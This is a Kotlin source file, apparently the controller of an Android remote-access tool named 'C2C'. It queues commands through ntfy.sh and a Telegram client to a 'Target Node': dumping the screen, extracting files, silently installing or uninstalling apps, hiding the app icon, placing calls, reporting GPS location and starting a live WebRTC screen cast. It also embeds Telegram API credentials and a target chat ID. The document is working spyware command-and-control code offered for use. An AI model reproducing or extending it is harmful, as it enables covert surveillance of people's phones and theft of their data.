package com.c2c

import android.annotation.SuppressLint
import android.app.Application
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.hardware.camera2.CameraManager
import android.location.LocationManager
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.widget.Toast
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateListOf
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.AndroidViewModel
import androidx.lifecycle.viewModelScope
import com.c2c.data.local.AppDatabase
import com.c2c.data.local.CommandEntity
import com.c2c.webrtc.WebRtcManager
import io.ktor.client.HttpClient
import io.ktor.client.engine.cio.CIO
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.websocket.Frame
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.delay
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.asStateFlow
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.flow.update
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.drinkless.tdlib.Client
import org.drinkless.tdlib.TdApi
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.MediaStream
import org.webrtc.VideoTrack
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

data class QueuedCommand(val uiKey: String, val cmd: String, val arg: String)

data class AppSettings(
    val ntfyUrl: String, val ntfyTopic: String, val serverIp: String, val port: String,
    val apiId: String, val apiHash: String, val chatId: String
)

class CoreViewModel(application: Application) : AndroidViewModel(application) {
    
    private val appCtx = application
    private val prefs = application.getSharedPreferences("CoreConfig", Context.MODE_PRIVATE)
    
    private val database = AppDatabase.getDatabase(application)
    private val commandDao = database.commandDao()
    private val httpClient = HttpClient(CIO) { engine { requestTimeout = 65_000 } }
    
    val webRtcManager = WebRtcManager(application) { sdpJsonString ->
        sendLive("webrtc_signaling", sdpJsonString)
    }

    private val _commands = MutableStateFlow<List<CommandEntity>>(emptyList())
    val commands: StateFlow<List<CommandEntity>> = _commands.asStateFlow()

    // --- Resilient Queue Engine State ---
    private val _pendingCommands = MutableStateFlow<Set<String>>(emptySet())
    val pendingCommands = _pendingCommands.asStateFlow()
    private var commandQueue = Channel<QueuedCommand>(Channel.UNLIMITED)
    private var workerJob: Job? = null
    private val isNetworkAvailable = MutableStateFlow(true)

    var remoteVideoTrack by mutableStateOf<VideoTrack?>(null)

    var serverLogs = mutableStateListOf<String>()
    var latestSlabTxt by mutableStateOf(ServerCore.lastStatusSlab)

    var tdLogs = mutableStateListOf<String>()
    var tgMessages = mutableStateListOf<TgMessage>()
    var tgChatName by mutableStateOf("Target Node")
    var tgChatId by mutableStateOf(0L)

    private val cameraManager = application.getSystemService(Context.CAMERA_SERVICE) as CameraManager
    private val audioManager = application.getSystemService(Context.AUDIO_SERVICE) as AudioManager
    private val locationManager = application.getSystemService(Context.LOCATION_SERVICE) as LocationManager

    var tdClient: Client? = null
    var tdAuthState by mutableStateOf(TdAuthState.CLOSED)
    var isTdLibEngineRunning by mutableStateOf(false)

    init {
        webRtcManager.initialize()
        loadLocalChatHistory()
        monitorNetwork()
        startQueueWorkers()

        viewModelScope.launch(Dispatchers.IO) {
            commandDao.getAllCommands().collect { list ->
                if (list.isEmpty()) seedDefaultCommands()
                else _commands.value = list
            }
        }

        viewModelScope.launch(Dispatchers.Main) {
            ServerCore.logsFlow.collect { log ->
                if (log.contains("RECV:") && log.contains("\"cmd\":\"webrtc_signaling\"")) {
                    try {
                        val wrapper = JSONObject(log.substringAfter("RECV: "))
                        val payload = JSONObject(wrapper.getString("arg"))
                        webRtcManager.handleSignalingMessage(payload)
                    } catch (e: Exception) {}
                }
                if (serverLogs.size > 150) serverLogs.removeAt(0)
                serverLogs.add(log)
                latestSlabTxt = ServerCore.lastStatusSlab
            }
        }
    }

    // --- Settings Engine ---
    fun getSettings(): AppSettings {
        return AppSettings(
            ntfyUrl = prefs.getString("ntfyUrl", "https://ntfy.sh") ?: "https://ntfy.sh",
            ntfyTopic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789") ?: "sys_linker_initial_comm_channel_xyz789",
            serverIp = prefs.getString("serverIp", "0.0.0.0") ?: "0.0.0.0",
            port = prefs.getInt("port", 8765).toString(),
            apiId = prefs.getInt("tdApiId", 25029226).toString(),
            apiHash = prefs.getString("tdApiHash", "9943012755ea9fab57b4f7e42eeb99c6") ?: "9943012755ea9fab57b4f7e42eeb99c6",
            chatId = prefs.getLong("tdTargetChatId", 7956541572L).toString()
        )
    }

    fun saveSettings(settings: AppSettings) {
        prefs.edit()
            .putString("ntfyUrl", settings.ntfyUrl)
            .putString("ntfyTopic", settings.ntfyTopic)
            .putString("serverIp", settings.serverIp)
            .putInt("port", settings.port.toIntOrNull() ?: 8765)
            .putInt("tdApiId", settings.apiId.toIntOrNull() ?: 25029226)
            .putString("tdApiHash", settings.apiHash)
            .putLong("tdTargetChatId", settings.chatId.toLongOrNull() ?: 7956541572L)
            .apply()
        ServerCore.log("Core Settings Applied.", true)
    }

    // --- Resilient Queue Engine ---
    private fun monitorNetwork() {
        val connectivityManager = appCtx.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val request = NetworkRequest.Builder().addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
        connectivityManager.registerNetworkCallback(request, object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) { isNetworkAvailable.value = true }
            override fun onLost(network: Network) { isNetworkAvailable.value = false }
        })
    }

    private fun startQueueWorkers() {
        workerJob?.cancel()
        commandQueue.cancel()
        commandQueue = Channel(Channel.UNLIMITED)
        _pendingCommands.value = emptySet()

        workerJob = viewModelScope.launch(Dispatchers.IO) {
            repeat(3) {
                launch {
                    for (task in commandQueue) {
                        processTask(task)
                    }
                }
            }
        }
    }

    private suspend fun processTask(task: QueuedCommand) {
        var success = false
        while (!success) {
            if (!_pendingCommands.value.contains(task.uiKey)) return

            isNetworkAvailable.first { it }
            try {
                val url = prefs.getString("ntfyUrl", "https://ntfy.sh")!!
                val topic = prefs.getString("ntfyTopic", "sys_linker_initial_comm_channel_xyz789")!!
                val targetUrl = if (url.startsWith("http")) "${url.trimEnd('/')}/$topic" else "https://$url/${topic.trimEnd('/')}"
                
                val payload = if (task.arg.isNotBlank()) {
                    """{"cmd": "${task.cmd.replace("\"", "\\\"")}", "arg": "${task.arg.replace("\"", "\\\"")}"}"""
                } else {
                    """{"cmd": "${task.cmd.replace("\"", "\\\"")}"}"""
                }

                httpClient.post(targetUrl) { setBody(payload) }
                success = true
                ServerCore.log("SENT: ${task.cmd}", true)
            } catch (e: Exception) {
                ServerCore.log("NETWORK DROP: ${task.cmd} paused. Retrying...", false)
                delay(3000)
            }
        }
        _pendingCommands.update { it - task.uiKey }
    }

    fun executeCommand(cmd: String, arg: String = "", uiKey: String = cmd) {
        _pendingCommands.update { it + uiKey }
        commandQueue.trySend(QueuedCommand(uiKey, cmd, arg))
        ServerCore.log("QUEUED: $cmd")
    }

    fun activateKillSwitch() {
        ServerCore.log("KILL SWITCH ENGAGED: Purging command queue.", false)
        startQueueWorkers()
    }

    // --- Database Operations ---
    fun addCommand(label: String, cmd: String, arg: String, icon: String) {
        viewModelScope.launch(Dispatchers.IO) {
            commandDao.insertCommand(CommandEntity(label = label, cmd = cmd, defaultArg = arg, icon = icon))
        }
    }

    fun deleteCommand(command: CommandEntity) {
        viewModelScope.launch(Dispatchers.IO) {
            commandDao.deleteCommand(command)
        }
    }

    private suspend fun seedDefaultCommands() {
        val defaults = listOf(
            CommandEntity(label = "Ping Target", cmd = "ping", defaultArg = "", icon = "radar"),
            CommandEntity(label = "Full Intel", cmd = "info", defaultArg = "", icon = "info"),
            CommandEntity(label = "Dump Screen", cmd = "dump_screen", defaultArg = "", icon = "screenshot_monitor"),
            CommandEntity(label = "Track Macro", cmd = "track_activity", defaultArg = "10, temp_macro", icon = "track_changes"),
            CommandEntity(label = "Perform Macro", cmd = "perform", defaultArg = "2, 1, temp_macro", icon = "play_arrow"),
            CommandEntity(label = "Workflow Send", cmd = "workflow", defaultArg = "default", icon = "account_tree"),
            CommandEntity(label = "WF Status", cmd = "status_workflow", defaultArg = "default", icon = "description"),
            CommandEntity(label = "Extract File", cmd = "send", defaultArg = "filename.txt", icon = "upload_file"),
            CommandEntity(label = "Toggle Wi-Fi", cmd = "toggle_wifi", defaultArg = "on", icon = "wifi"),
            CommandEntity(label = "Toggle Hotspot", cmd = "toggle_hotspot", defaultArg = "on", icon = "router"),
            CommandEntity(label = "App Install", cmd = "install_app", defaultArg = "/sdcard/app.apk", icon = "system_update"),
            CommandEntity(label = "App Uninstall", cmd = "uninstall_app", defaultArg = "com.whatsapp", icon = "delete_sweep"),
            CommandEntity(label = "Hide Icon", cmd = "icon_hide", defaultArg = "", icon = "visibility_off"),
            CommandEntity(label = "VoIP Call", cmd = "call", defaultArg = "nm, loud", icon = "phone"),
            CommandEntity(label = "End Call", cmd = "end_call", defaultArg = "", icon = "phone_disabled"),
            CommandEntity(label = "Download URL", cmd = "download_url", defaultArg = "{\"url\":\"https://...\"}", icon = "cloud_download")
        )
        defaults.forEach { commandDao.insertCommand(it) }
    }

    // --- WebRTC ---
    fun initiateWebRtcConnection() {
        webRtcManager.createPeerConnection(isCaller = true) { stream ->
            if (stream.videoTracks.isNotEmpty()) {
                remoteVideoTrack = stream.videoTracks[0]
            }
        }
        executeCommand("start_webrtc", "", "live_rtc_init")
    }

    fun terminateWebRtcConnection() {
        webRtcManager.peerConnection?.close()
        webRtcManager.peerConnection = null
        remoteVideoTrack = null
        sendLive("live_screen_cast", "stop")
    }

    fun tdLog(msg: String, type: String = "INFO") {
        val time = SimpleDateFormat("HH:mm:ss.SSS", Locale.getDefault()).format(Date())
        viewModelScope.launch(Dispatchers.Main) {
            if (tdLogs.size > 1000) tdLogs.removeAt(0)
            tdLogs.add("[$time] [$type] $msg")
        }
    }

    fun dumpTdLogs(context: Context) {
        viewModelScope.launch(Dispatchers.IO) {
            try {
                val dir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
                val file = File(dir, "TDLib_Diagnostic_Log_${System.currentTimeMillis()}.txt")
                file.writeText(tdLogs.joinToString("\n"))
                withContext(Dispatchers.Main) { Toast.makeText(context, "Logs dumped to Downloads folder!", Toast.LENGTH_LONG).show() }
            } catch (e: Exception) { tdLog("Dump Failed: ${e.message}", "ERROR") }
        }
    }

    private fun sendTd(query: TdApi.Function<*>, onResult: ((TdApi.Object) -> Unit)? = null) {
        try {
            tdClient?.send(query) { res ->
                if (res is TdApi.Error) tdLog("${query.javaClass.simpleName} Failed: [${res.code}] ${res.message}", "ERROR")
                else onResult?.invoke(res)
            }
        } catch (e: Exception) {
            tdLog("Exception executing ${query.javaClass.simpleName}: ${e.message}", "ERROR")
        }
    }

    fun toggleTdLib() {
        if (isTdLibEngineRunning) {
            tdLog("Initiating Engine Shutdown...", "INFO")
            sendTd(TdApi.Close()) { tdAuthState = TdAuthState.CLOSED; isTdLibEngineRunning = false; tdLog("Engine Offline", "SUCCESS") }
            tdClient = null
        } else {
            tdLog("Igniting TDLib Core Engine...", "INFO")
            isTdLibEngineRunning = true
            tdAuthState = TdAuthState.INIT
            tgMessages.clear()
            Client.execute(TdApi.SetLogVerbosityLevel().apply { newVerbosityLevel = 1 })
            tdClient = Client.create({ update -> handleTdUpdate(update) }, { e -> tdLog("JNI Exception: ${e.message}", "ERROR") }, { e -> tdLog("JNI Crash: ${e.message}", "ERROR") })
        }
    }

    private fun handleTdUpdate(update: TdApi.Object) {
        viewModelScope.launch(Dispatchers.Main) {
            when (update) {
                is TdApi.UpdateAuthorizationState -> {
                    tdLog("Auth State Shift: ${update.authorizationState.javaClass.simpleName}", "INFO")
                    when (update.authorizationState) {
                        is TdApi.AuthorizationStateWaitTdlibParameters -> {
                            val params = TdApi.SetTdlibParameters().apply {
                                useTestDc = false
                                databaseDirectory = File(appCtx.filesDir, "tdlib").absolutePath
                                useMessageDatabase = true
                                useSecretChats = true
                                apiId = prefs.getInt("tdApiId", 25029226)
                                apiHash = prefs.getString("tdApiHash", "9943012755ea9fab57b4f7e42eeb99c6")
                                systemLanguageCode = "en"
                                deviceModel = Build.MODEL
                                applicationVersion = "1.0"
                            }
                            sendTd(params)
                        }
                        is TdApi.AuthorizationStateWaitPhoneNumber -> tdAuthState = TdAuthState.WAIT_PHONE
                        is TdApi.AuthorizationStateWaitCode -> tdAuthState = TdAuthState.WAIT_CODE
                        is TdApi.AuthorizationStateWaitPassword -> tdAuthState = TdAuthState.WAIT_PASSWORD
                        is TdApi.AuthorizationStateReady -> {
                            tdAuthState = TdAuthState.READY
                            tgChatId = prefs.getLong("tdTargetChatId", 7956541572L)
                            tdLog("Engine Authenticated. Target Chat ID: $tgChatId", "SUCCESS")
                            if (tgChatId != 0L) fetchChatHistory() else tdLog("Target Chat ID is 0. Cannot fetch history.", "WARN")
                        }
                        is TdApi.AuthorizationStateClosed -> { tdAuthState = TdAuthState.CLOSED; isTdLibEngineRunning = false }
                    }
                }
                is TdApi.UpdateConnectionState -> tdLog("Connection Matrix: ${update.state.javaClass.simpleName}", "INFO")
                is TdApi.Error -> tdLog("TDLib Internal Error: [${update.code}] ${update.message}", "ERROR")
                is TdApi.UpdateNewMessage -> {
                    val msg = update.message
                    if (msg.chatId == tgChatId) {
                        val content = msg.content
                        if (content is TdApi.MessageText) {
                            tgMessages.add(TgMessage(msg.id, content.text.text, msg.isOutgoing, msg.date * 1000L))
                            tgMessages.sortBy { it.timestamp }
                            saveLocalChatHistory()
                            tdLog("Received Message: ${content.text.text}", "INFO")
                            if (!msg.isOutgoing) executeHardwareCommand(content.text.text)
                        }
                    }
                }
            }
        }
    }

    fun tdSendPhone(phone: String) { tdLog("Submitting Phone...", "INFO"); sendTd(TdApi.SetAuthenticationPhoneNumber().apply { phoneNumber = phone }) }
    fun tdSendCode(code: String) { tdLog("Submitting OTP...", "INFO"); sendTd(TdApi.CheckAuthenticationCode().apply { this.code = code }) }
    fun tdSendPassword(pass: String) { tdLog("Submitting 2FA...", "INFO"); sendTd(TdApi.CheckAuthenticationPassword().apply { password = pass }) }

    private fun fetchChatHistory() {
        tdLog("Requesting Chat Data for ID: $tgChatId...", "INFO")
        sendTd(TdApi.LoadChats().apply { chatList = null; limit = 100 })
        sendTd(TdApi.GetChat().apply { chatId = tgChatId }) { chat -> 
            if (chat is TdApi.Chat) {
                tdLog("Chat Identity Confirmed: ${chat.title}", "SUCCESS")
                viewModelScope.launch(Dispatchers.Main) { tgChatName = chat.title } 
            }
        }
        sendTd(TdApi.GetChatHistory().apply { chatId = tgChatId; limit = 50 }) { res ->
            if (res is TdApi.Messages) {
                tdLog("History Extracted: ${res.messages.size} messages found.", "SUCCESS")
                viewModelScope.launch(Dispatchers.Main) {
                    val newMsgs = res.messages.filter { it.content is TdApi.MessageText }.map { msg ->
                        TgMessage(msg.id, (msg.content as TdApi.MessageText).text.text, msg.isOutgoing, msg.date * 1000L)
                    }
                    tgMessages.clear()
                    tgMessages.addAll(newMsgs.reversed())
                    saveLocalChatHistory()
                }
            }
        }
    }

    fun sendTelegramMessage(text: String, isMe: Boolean = true) {
        if (tgChatId == 0L || tdClient == null) {
            tdLog("Cannot send message. Engine offline or Chat ID is 0.", "ERROR")
            return
        }
        viewModelScope.launch(Dispatchers.Main) {
            tgMessages.add(TgMessage(System.currentTimeMillis(), text, isMe, System.currentTimeMillis()))
            saveLocalChatHistory()
        }
        if (isMe) {
            viewModelScope.launch(Dispatchers.IO) {
                tdLog("Dispatching Payload...", "INFO")
                val formattedText = TdApi.FormattedText().apply { this.text = text; this.entities = emptyArray() }
                val inputContent = TdApi.InputMessageText().apply { this.text = formattedText }
                val request = TdApi.SendMessage().apply { this.chatId = tgChatId; this.inputMessageContent = inputContent }
                sendTd(request) { tdLog("Payload Sent Successfully.", "SUCCESS") }
            }
        }
    }

    private fun loadLocalChatHistory() {
        try {
            val arr = JSONArray(prefs.getString("tg_history", "[]"))
            tgMessages.clear()
            for (i in 0 until arr.length()) {
                val obj = arr.getJSONObject(i)
                tgMessages.add(TgMessage(obj.getLong("id"), obj.getString("text"), obj.getBoolean("isMe"), obj.getLong("timestamp")))
            }
        } catch (e: Exception) {}
    }

    private fun saveLocalChatHistory() {
        val arr = JSONArray()
        tgMessages.forEach { msg -> arr.put(JSONObject().put("id", msg.id).put("text", msg.text).put("isMe", msg.isMe).put("timestamp", msg.timestamp)) }
        prefs.edit().putString("tg_history", arr.toString()).apply()
    }

    @SuppressLint("MissingPermission")
    private fun executeHardwareCommand(cmdString: String) {
        val parts = cmdString.split(" ")
        val cmd = parts[0].lowercase().removePrefix("/")
        val arg = if (parts.size > 1) parts[1] else ""
        viewModelScope.launch(Dispatchers.IO) {
            when (cmd) {
                "ping" -> {
                    val bat = appCtx.registerReceiver(null, IntentFilter(Intent.ACTION_BATTERY_CHANGED))?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
                    sendTelegramMessage("🟢 Node Online.\n🔋 Battery: $bat%")
                }
                "loc" -> {
                    sendTelegramMessage("🛰️ Fetching GPS...")
                    try {
                        val loc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                        if (loc != null) sendTelegramMessage("📍 <b>Location Acquired:</b>\nLat: ${loc.latitude}\nLng: ${loc.longitude}") else sendTelegramMessage("❌ Location unavailable.")
                    } catch (e: Exception) { sendTelegramMessage("❌ GPS Error") }
                }
                "flash" -> {
                    try {
                        val state = arg.lowercase() == "on"
                        cameraManager.setTorchMode(cameraManager.cameraIdList[0], state)
                        sendTelegramMessage(if (state) "🔦 Flashlight Enabled" else "🔦 Flashlight Disabled")
                    } catch (e: Exception) { sendTelegramMessage("❌ Camera Hardware Error.") }
                }
                "vol" -> {
                    val targetVol = arg.toIntOrNull() ?: 50
                    val max = audioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC)
                    audioManager.setStreamVolume(AudioManager.STREAM_MUSIC, (targetVol * max) / 100, 0)
                    sendTelegramMessage("🔊 Volume set to $targetVol%")
                }
                "live_start" -> { sendTelegramMessage("⚡ Initiating Live WebSocket..."); toggleServer(appCtx) }
                "live_stop" -> { ServerCore.ktorServer?.stop(1000, 2000); ServerCore.isRunning = false; sendTelegramMessage("🛑 Core Node Terminated.") }
            }
        }
    }

    fun sendLive(cmd: String, arg: String = "") {
        viewModelScope.launch(Dispatchers.IO) {
            if (ServerCore.liveSessions.isNotEmpty()) {
                val json = if(arg.isNotBlank()) """{"cmd":"$cmd","arg":"$arg"}""" else """{"cmd":"$cmd"}"""
                ServerCore.liveSessions.forEach { try { it.send(Frame.Text(json)) } catch(e: Exception){} }
            }
        }
    }

    fun toggleServer(context: Context) {
        val intent = Intent(context, C2ServerService::class.java).apply { putExtra("port", prefs.getInt("port", 8765)) }
        if (ServerCore.isRunning) { context.stopService(intent) } else { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) context.startForegroundService(intent) else context.startService(intent) }
    }
}